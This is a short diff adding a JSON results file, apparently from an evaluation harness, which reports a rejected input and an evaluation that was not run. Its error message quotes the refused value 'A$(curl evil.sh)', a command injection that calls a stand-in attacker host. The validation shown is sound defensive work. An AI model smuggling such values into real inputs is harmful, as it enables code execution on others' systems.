@@ -1,0 +1,9 @@
+{
+ "schema": "daedelus.live-results/1",
+ "summary": {
+  "infrastructure": "input_rejected",
+  "live_evaluation": "NOT RUN",
+  "exit_code": 2
+ },
+ "error": "tasks: must be 1-5 of the letters A B C D E with no other characters (got 'A$(curl evil.sh)')"
+}
